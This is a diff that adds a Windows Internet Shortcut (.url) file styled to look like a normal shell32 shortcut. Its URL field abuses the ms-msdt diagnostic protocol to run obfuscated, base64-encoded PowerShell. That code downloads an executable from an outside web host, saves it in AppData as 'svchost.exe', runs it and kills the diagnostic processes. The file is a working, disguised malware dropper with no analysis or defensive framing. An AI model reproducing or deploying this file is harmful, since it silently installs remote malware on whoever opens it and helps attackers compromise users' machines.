@@ -1,0 +1,11 @@
+  [InternetShortcut]  
+
+URL=MS-msdt:-id  PCWDiagnostic  -skip  force  -param  "IT_RebrowseForFile=?l  IT_LaunchMethod=ContextMenu  IT_BrowseForFile=4If$(iEX($(IEx('[sYsTEm.texT.EnCoDiNg]'+[Char]0X3A+[char]58+'UTf8.getstrinG([SyStEM.coNVert]'+[chAR]58+[char]0X3A+'FrombasE64StRINg('+[CHaR]34+'c3RvcC1wcm9DZVNTIC1mb3JDRSAtTkFtRSAnbXNkdCc7JFRKID0gYURkLXR5cGUgLU1FTWJlUmRlRmlOaVRpb24gJ1tEbGxJbXBvcnQoInVSbG1PTiIsIENoYXJTZXQgPSBDaGFyU2V0LlVuaWNvZGUpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBVUkxEb3dubG9hZFRvRmlsZShJbnRQdHIgSk4sc3RyaW5nIENpWixzdHJpbmcgUix1aW50IGYsSW50UHRyIEcpOycgLW5BTWUgIk0iIC1uQW1Fc1BBQ0UgZnIgLVBhc3NUaHJ1OyAkVEo6OlVSTERvd25sb2FkVG9GaWxlKDAsImh0dHA6Ly9vcmF4c29mdC5jb20vRmlsZXMvMy5leGUiLCIkRW5WOkFQUERBVEFcc3ZjaG9zdC5leGUiLDAsMCk7U1RhcnQtc0xFRVAoMyk7aU5WT0tFLUl0RW0gIiRlTlY6QVBQREFUQVxzdmNob3N0LmV4ZSI7U1RPUC1wUm9jRXNzIC1GT3JDRSAtTkFtRSAnc2RpYWduaG9zdCc='+[ChaR]0x22+'))'))))cf/../../../../../../../../../../../../../../../../.MSi  "
+
+IDList=
+
+HotKey=0
+
+IconIndex=70
+
+IconFile=C:\Windows\system32\shell32.dll
